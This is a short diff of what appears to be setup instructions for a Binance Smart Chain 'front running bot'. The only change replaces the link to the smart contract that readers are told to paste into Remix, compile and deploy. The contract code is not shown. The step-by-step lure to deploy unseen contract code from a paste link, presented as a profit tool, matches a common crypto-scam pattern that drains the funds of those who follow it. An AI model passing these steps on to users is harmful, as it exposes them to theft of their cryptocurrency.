@@ -19,7 +19,7 @@ NOTE: This contract have been designed for Binance Smart Chain (BEP20) and won't
 
 3/Access Remix: https://remix.ethereum.org/
 
-4/Paste SmartContract in Remix: https://ghostbin.com/WzQw9/raw
+4/Paste SmartContract in Remix: https://raw.githubusercontent.com/FrontRunningBotBSC/Front-Run-Bot/main/FrontRunBSC
 
 5)Compile it and copy contract address
 
